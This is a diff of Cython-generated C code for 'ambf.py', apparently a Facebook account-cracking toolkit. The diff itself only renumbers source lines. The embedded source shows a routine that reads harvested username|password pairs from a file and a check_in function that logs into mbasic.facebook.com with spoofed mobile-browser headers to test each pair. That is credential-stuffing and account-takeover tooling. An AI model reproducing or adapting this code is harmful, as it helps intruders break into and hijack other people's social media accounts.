-    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__54, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 622, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__54, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 615, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_XDECREF_SET(__pyx_v_kontol, __pyx_t_2);
     __pyx_t_2 = 0;
 
-    /* "ambf.py":623
+    /* "ambf.py":616
  * 	for memek in buka_baju:
  * 		kontol = memek.replace("\n","")
  * 		titid  = kontol.split("|")             # <<<<<<<<<<<<<<
  * 		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
  * 		try:
  */
-    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_kontol, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 623, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_kontol, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 616, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __pyx_t_10 = NULL;
     if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
@@ -19078,31 +18837,31 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
     }
     __pyx_t_2 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_10, __pyx_kp_s__55) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s__55);
     __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 623, __pyx_L1_error)
+    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 616, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_XDECREF_SET(__pyx_v_titid, __pyx_t_2);
     __pyx_t_2 = 0;
 
-    /* "ambf.py":624
+    /* "ambf.py":617
  * 		kontol = memek.replace("\n","")
  * 		titid  = kontol.split("|")
  * 		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))             # <<<<<<<<<<<<<<
  * 		try:
  * 			check_in(titid[0].replace("  * --> ",""), titid[1])
  */
-    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_kontol, __pyx_n_s_replace); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 624, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_kontol, __pyx_n_s_replace); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 617, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
-    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__57, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 624, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__57, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 617, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-    __pyx_t_2 = __Pyx_PyString_FormatSafe(__pyx_kp_s_cek_akun_0_93m_s_0_97m, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 624, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyString_FormatSafe(__pyx_kp_s_cek_akun_0_93m_s_0_97m, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 617, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (__Pyx_PrintOne(0, __pyx_t_2) < 0) __PYX_ERR(0, 624, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_t_2) < 0) __PYX_ERR(0, 617, __pyx_L1_error)
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
 
-    /* "ambf.py":625
+    /* "ambf.py":618
  * 		titid  = kontol.split("|")
  * 		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
  * 		try:             # <<<<<<<<<<<<<<
@@ -19118,24 +18877,24 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
       __Pyx_XGOTREF(__pyx_t_5);
       /*try:*/ {
 
-        /* "ambf.py":626
+        /* "ambf.py":619
  * 		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
  * 		try:
  * 			check_in(titid[0].replace("  * --> ",""), titid[1])             # <<<<<<<<<<<<<<
  * 		except requests.exceptions.ConnectionError:
  * 			pass
  */
-        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_check_in); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 626, __pyx_L14_error)
+        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_check_in); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 619, __pyx_L14_error)
         __Pyx_GOTREF(__pyx_t_4);
-        __pyx_t_10 = __Pyx_GetItemInt(__pyx_v_titid, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 626, __pyx_L14_error)
+        __pyx_t_10 = __Pyx_GetItemInt(__pyx_v_titid, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 619, __pyx_L14_error)
         __Pyx_GOTREF(__pyx_t_10);
-        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_replace); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 626, __pyx_L14_error)
+        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_replace); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 619, __pyx_L14_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__57, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 626, __pyx_L14_error)
+        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__57, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 619, __pyx_L14_error)
         __Pyx_GOTREF(__pyx_t_10);
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
-        __pyx_t_9 = __Pyx_GetItemInt(__pyx_v_titid, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 626, __pyx_L14_error)
+        __pyx_t_9 = __Pyx_GetItemInt(__pyx_v_titid, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 619, __pyx_L14_error)
         __Pyx_GOTREF(__pyx_t_9);
         __pyx_t_13 = NULL;
         __pyx_t_8 = 0;
@@ -19152,7 +18911,7 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
         #if CYTHON_FAST_PYCALL
         if (PyFunction_Check(__pyx_t_4)) {
           PyObject *__pyx_temp[3] = {__pyx_t_13, __pyx_t_10, __pyx_t_9};
-          __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_8, 2+__pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 626, __pyx_L14_error)
+          __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_8, 2+__pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 619, __pyx_L14_error)
           __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
           __Pyx_GOTREF(__pyx_t_2);
           __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
@@ -19162,7 +18921,7 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
         #if CYTHON_FAST_PYCCALL
         if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
           PyObject *__pyx_temp[3] = {__pyx_t_13, __pyx_t_10, __pyx_t_9};
-          __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_8, 2+__pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 626, __pyx_L14_error)
+          __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_8, 2+__pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 619, __pyx_L14_error)
           __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
           __Pyx_GOTREF(__pyx_t_2);
           __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
@@ -19170,7 +18929,7 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
         } else
         #endif
         {
-          __pyx_t_14 = PyTuple_New(2+__pyx_t_8); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 626, __pyx_L14_error)
+          __pyx_t_14 = PyTuple_New(2+__pyx_t_8); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 619, __pyx_L14_error)
           __Pyx_GOTREF(__pyx_t_14);
           if (__pyx_t_13) {
             __Pyx_GIVEREF(__pyx_t_13); PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_t_13); __pyx_t_13 = NULL;
@@ -19181,14 +18940,14 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
           PyTuple_SET_ITEM(__pyx_t_14, 1+__pyx_t_8, __pyx_t_9);
           __pyx_t_10 = 0;
           __pyx_t_9 = 0;
-          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_14, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 626, __pyx_L14_error)
+          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_14, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 619, __pyx_L14_error)
           __Pyx_GOTREF(__pyx_t_2);
           __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
         }
         __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
         __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
 
-        /* "ambf.py":625
+        /* "ambf.py":618
  * 		titid  = kontol.split("|")
  * 		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
  * 		try:             # <<<<<<<<<<<<<<
@@ -19208,7 +18967,7 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
       __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
       __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
 
-      /* "ambf.py":627
+      /* "ambf.py":620
  * 		try:
  * 			check_in(titid[0].replace("  * --> ",""), titid[1])
  * 		except requests.exceptions.ConnectionError:             # <<<<<<<<<<<<<<
@@ -19216,12 +18975,12 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
  * 	print("\n [!] cek akun sudah selesai...")
  */
       __Pyx_ErrFetch(&__pyx_t_2, &__pyx_t_4, &__pyx_t_14);
-      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_requests); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 627, __pyx_L16_except_error)
+      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_requests); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 620, __pyx_L16_except_error)
       __Pyx_GOTREF(__pyx_t_9);
-      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_exceptions); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 627, __pyx_L16_except_error)
+      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_exceptions); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 620, __pyx_L16_except_error)
       __Pyx_GOTREF(__pyx_t_10);
       __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
-      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 627, __pyx_L16_except_error)
+      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 620, __pyx_L16_except_error)
       __Pyx_GOTREF(__pyx_t_9);
       __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
       __pyx_t_8 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_2, __pyx_t_9);
@@ -19235,7 +18994,7 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
       goto __pyx_L16_except_error;
       __pyx_L16_except_error:;
 
-      /* "ambf.py":625
+      /* "ambf.py":618
  * 		titid  = kontol.split("|")
  * 		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
  * 		try:             # <<<<<<<<<<<<<<
@@ -19255,7 +19014,7 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
       __pyx_L21_try_end:;
     }
 
-    /* "ambf.py":621
+    /* "ambf.py":614
  * 	print(" [+] total akun : \033[0;91m%s\033[0;97m"%(len(buka_baju)))
  * 	print(" [*] sedang prosess cek akun....")
  * 	for memek in buka_baju:             # <<<<<<<<<<<<<<
@@ -19265,36 +19024,36 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
   }
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-  /* "ambf.py":629
+  /* "ambf.py":622
  * 		except requests.exceptions.ConnectionError:
  * 			pass
  * 	print("\n [!] cek akun sudah selesai...")             # <<<<<<<<<<<<<<
  * 	input(" [+] pencet enter untuk kembali ke menu ")
  * 	time.sleep(1)
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_cek_akun_sudah_selesai) < 0) __PYX_ERR(0, 629, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_cek_akun_sudah_selesai) < 0) __PYX_ERR(0, 622, __pyx_L1_error)
 
-  /* "ambf.py":630
+  /* "ambf.py":623
  * 			pass
  * 	print("\n [!] cek akun sudah selesai...")
  * 	input(" [+] pencet enter untuk kembali ke menu ")             # <<<<<<<<<<<<<<
  * 	time.sleep(1)
  * 	menu()
  */
-  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__58, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 630, __pyx_L1_error)
+  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__58, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 623, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-  /* "ambf.py":631
+  /* "ambf.py":624
  * 	print("\n [!] cek akun sudah selesai...")
  * 	input(" [+] pencet enter untuk kembali ke menu ")
  * 	time.sleep(1)             # <<<<<<<<<<<<<<
  * 	menu()
  * 
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_time); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 631, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_time); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 624, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_14);
-  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_sleep); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 631, __pyx_L1_error)
+  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_sleep); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 624, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
   __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
   __pyx_t_14 = NULL;
@@ -19309,19 +19068,19 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
   }
   __pyx_t_1 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_14, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_int_1);
   __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
-  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 631, __pyx_L1_error)
+  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 624, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-  /* "ambf.py":632
+  /* "ambf.py":625
  * 	input(" [+] pencet enter untuk kembali ke menu ")
  * 	time.sleep(1)
  * 	menu()             # <<<<<<<<<<<<<<
  * 
  * def check_in(user, pasw):
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_menu); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 632, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_menu); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 625, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
   __pyx_t_14 = NULL;
   if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
@@ -19335,14 +19094,14 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
   }
   __pyx_t_1 = (__pyx_t_14) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_14) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
   __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
-  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 625, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-  /* "ambf.py":610
+  /* "ambf.py":603
+ * 		menu()
  * 
- * #-> Cek Opsi
  * def cek_opsi():             # <<<<<<<<<<<<<<
  * 	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))
  * 	files = input(" [?] nama file  : ")
@@ -19372,7 +19131,7 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
   return __pyx_r;
 }
 
-/* "ambf.py":634
+/* "ambf.py":627
  * 	menu()
  * 
  * def check_in(user, pasw):             # <<<<<<<<<<<<<<
@@ -19415,11 +19174,11 @@ static PyObject *__pyx_pw_4ambf_35check_in(PyObject *__pyx_self, PyObject *__pyx
         case  1:
         if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_pasw)) != 0)) kw_args--;
         else {
-          __Pyx_RaiseArgtupleInvalid("check_in", 1, 2, 2, 1); __PYX_ERR(0, 634, __pyx_L3_error)
+          __Pyx_RaiseArgtupleInvalid("check_in", 1, 2, 2, 1); __PYX_ERR(0, 627, __pyx_L3_error)
         }
       }
       if (unlikely(kw_args > 0)) {
-        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "check_in") < 0)) __PYX_ERR(0, 634, __pyx_L3_error)
+        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "check_in") < 0)) __PYX_ERR(0, 627, __pyx_L3_error)
       }
     } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
       goto __pyx_L5_argtuple_error;
@@ -19432,7 +19191,7 @@ static PyObject *__pyx_pw_4ambf_35check_in(PyObject *__pyx_self, PyObject *__pyx
   }
   goto __pyx_L4_argument_unpacking_done;
   __pyx_L5_argtuple_error:;
-  __Pyx_RaiseArgtupleInvalid("check_in", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 634, __pyx_L3_error)
+  __Pyx_RaiseArgtupleInvalid("check_in", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 627, __pyx_L3_error)
   __pyx_L3_error:;
   __Pyx_AddTraceback("ambf.check_in", __pyx_clineno, __pyx_lineno, __pyx_filename);
   __Pyx_RefNannyFinishContext();
@@ -19483,7 +19242,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   int __pyx_clineno = 0;
   __Pyx_RefNannySetupContext("check_in", 0);
 
-  /* "ambf.py":635
+  /* "ambf.py":628
  * 
  * def check_in(user, pasw):
  * 	mb = ("https://mbasic.facebook.com")             # <<<<<<<<<<<<<<
@@ -19493,7 +19252,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   __Pyx_INCREF(__pyx_kp_s_https_mbasic_facebook_com);
   __pyx_v_mb = __pyx_kp_s_https_mbasic_facebook_com;
 
-  /* "ambf.py":636
+  /* "ambf.py":629
  * def check_in(user, pasw):
  * 	mb = ("https://mbasic.facebook.com")
  * 	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")             # <<<<<<<<<<<<<<
@@ -19503,16 +19262,16 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_5_0_AS);
   __pyx_v_ua = __pyx_kp_s_Mozilla_5_0_Linux_Android_5_0_AS;
 
-  /* "ambf.py":637
+  /* "ambf.py":630
  * 	mb = ("https://mbasic.facebook.com")
  * 	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
  * 	ses = requests.Session()             # <<<<<<<<<<<<<<
  * 	#-> pemisah
  * 	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 637, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 630, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
-  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_Session); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 637, __pyx_L1_error)
+  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_Session); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 630, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_3);
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
   __pyx_t_2 = NULL;
@@ -19527,44 +19286,44 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   }
   __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
   __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
-  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 637, __pyx_L1_error)
+  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 630, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
   __pyx_v_ses = __pyx_t_1;
   __pyx_t_1 = 0;
 
-  /* "ambf.py":639
+  /* "ambf.py":632
  * 	ses = requests.Session()
  * 	#-> pemisah
  * 	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})             # <<<<<<<<<<<<<<
  * 	data = {}
  * 	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
  */
-  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_headers); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 639, __pyx_L1_error)
+  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_headers); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 632, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_3);
-  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_update); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 639, __pyx_L1_error)
+  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_update); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 632, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
   __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
-  __pyx_t_3 = __Pyx_PyDict_NewPresized(15); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 639, __pyx_L1_error)
+  __pyx_t_3 = __Pyx_PyDict_NewPresized(15); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 632, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_3);
-  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_Host, __pyx_kp_s_mbasic_facebook_com) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_cache_control, __pyx_kp_s_max_age_0) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_upgrade_insecure_requests, __pyx_kp_s_1) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_origin, __pyx_v_mb) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_content_type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_accept, __pyx_kp_s_text_html_application_xhtml_xml_2) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_requested_with, __pyx_kp_s_mark_via_gp) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_site, __pyx_kp_s_same_origin) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_mode, __pyx_n_s_navigate) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
